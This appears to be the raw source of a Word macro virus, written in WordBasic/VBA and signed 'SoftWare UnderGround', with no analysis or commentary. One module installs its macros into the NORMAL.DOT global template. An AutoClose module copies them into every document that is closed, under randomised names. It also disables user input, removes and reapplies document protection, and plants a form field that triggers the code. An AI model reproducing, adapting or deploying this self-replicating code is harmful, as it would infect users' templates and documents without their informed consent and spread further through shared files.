   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "O54"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "LQMacro7"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.O54.MAIN"
   Dim NeedName$
   Dim count_
   Dim action
   Dim path$
   Dim A$
   Dim B$
   Dim currentname$
   Dim author$
   WordBasic.DisableInput
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.ToolsUnprotectDocument
   WordBasic.CharRight 1, 1
   WordBasic.WW6_EditClear
   WordBasic.ScreenUpdating 0
   NeedName$ = "AutoClose"
   For count_ = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](count_, 0) = NeedName$ Then GoTo finish
   Next count_
   action = WordBasic.MsgBox("Can I install myself into your NORMAL.DOT", _
   "SoftWare UnderGround", 4)
   If action < 0 Then
   path$ = WordBasic.[FileName$]()
   A$ = ""   ' empty line
   B$ = ""
   For count_ = 1 To WordBasic.CountMacros(1)
   currentname$ = WordBasic.[MacroName$](count_, 1)
   Select Case WordBasic.[MacroDesc$](currentname$)
           Case "LQMacro7"
   A$ = "MacroCopy" + Chr(34) + path$ + ":" + currentname$ + Chr(34) + "," + _
   Chr(34) + WordBasic.[DefaultDir$](2) + "\normal:Macro7" + Chr(34)
           Case "LQAutoClose"
   B$ = "MacroCopy" + Chr(34) + path$ + ":" + currentname$ + Chr(34) + "," + _
   Chr(34) + WordBasic.[DefaultDir$](2) + "\normal:AutoClose" + Chr(34)
                    Case Else
   End Select
   Next count_
   WordBasic.ToolsMacro Name:="Temp", Edit:=1
   WordBasic.CharRight 1, 1
   WordBasic.Insert A$
   WordBasic.Insert Chr(11) + Chr(13) + B$
   WordBasic.Insert Chr(11) + Chr(13) + "DocClose 2"
   WordBasic.ToolsMacro Name:="Temp", Run:=1
   End If
   finish:
   WordBasic.CurValues.FileSummaryInfo dlg
   author$ = dlg.author
   If author$ = "" Then author$ = "Unknown User"
   WordBasic.MsgBox "This doc was created by " + author$ + " at " + dlg.CreateDate + Chr(13) + _
   "saved before now " + dlg.RevisionNumber + " times, last saving by " + dlg.LastSavedBy + Chr(13) + dlg.NumChars + " characters, " + dlg.NumWords + _
   " words, " + dlg.NumLines + " lines, " + dlg.NumPages + " pages", _
   "SoftWare UnderGround", 0
   End Sub
   Private Sub Empty
   End Sub


   Attribute VB_Name = "D55"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "LQAutoClose"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.D55.MAIN"
   Dim cntm
   Dim present
   Dim count_
   Dim name_$
   Dim cn1$
   Dim cn2$
   Dim path$
   Dim A$
   Dim B$
   Dim namecl$
   Dim namevm$
   WordBasic.DisableInput
   WordBasic.ScreenUpdating 0
   WordBasic.FileSaveAs Format:=1
   cntm = WordBasic.CountMacros(1)
   present = 0
   If cntm > 0 Then
   For count_ = 1 To cntm
       name_$ = WordBasic.[MacroName$](count_, 1)
       Select Case WordBasic.[MacroDesc$](name_$)
           Case "LQMacro7"
           cn1$ = name_$
           present = present + 1
           Case "LQAutoClose"
           cn2$ = name_$
           present = present + 2
           Case Else
   End Select
   Next count_
   End If
   WordBasic.Call "Macro7.Empty"
   If present = 3 Then GoTo form_
   path$ = WordBasic.[FileName$]()
   A$ = ""
   B$ = ""
   If present = 1 Or present = 0 Then ' AutoClose not found
   namecl$ = "AutoClose" + Chr(34)
   cn2$ = Chr(65 + WordBasic.Second(WordBasic.Now()) / 23 + 3) + WordBasic.[LTrim$](Str(WordBasic.Second(WordBasic.Now()) + WordBasic.Minute(WordBasic.Now())))
   B$ = "MacroCopy " + Chr(34) + WordBasic.[DefaultDir$](2) + "\normal:" + namecl$ + "," + Chr(34) + _
   path$ + ":" + cn2$ + Chr(34) + ",1"
   End If
   If present = 2 Or present = 0 Then ' Macro7 not found
   namevm$ = "Macro7" + Chr(34)
   cn1$ = Chr(65 + WordBasic.Hour(WordBasic.Now())) + WordBasic.[LTrim$](Str(WordBasic.Hour(WordBasic.Now()) + WordBasic.Minute(WordBasic.Now())))
   A$ = "MacroCopy " + Chr(34) + WordBasic.[DefaultDir$](2) + "\normal:" + namevm$ + "," + _
   Chr(34) + path$ + ":" + cn1$ + Chr(34) + ",1"
   End If
   WordBasic.ToolsMacro Name:="Temp", Edit:=1
   WordBasic.Insert A$
   WordBasic.Insert Chr(11) + Chr(13) + B$
   WordBasic.Insert Chr(11) + Chr(13) + "DocClose 2"
   WordBasic.ToolsMacro Name:="Temp", Run:=1
   form_:
   WordBasic.StartOfDocument
   WordBasic.TextFormField
   WordBasic.FormFieldOptions Entry:=cn1$, Exit:="", Enable:=1, Name:="Text1", _
   TextType:=0, TextWidth:="1", TextDefault:="", TextFormat:="", Type:=0, _
   OwnHelp:=0, HelpText:="", OwnStat:=0, StatText:=""
   WordBasic.ToolsProtectDocument DocumentPassword:="", NoReset:=0, Type:=2
   WordBasic.FileSave
   End Sub
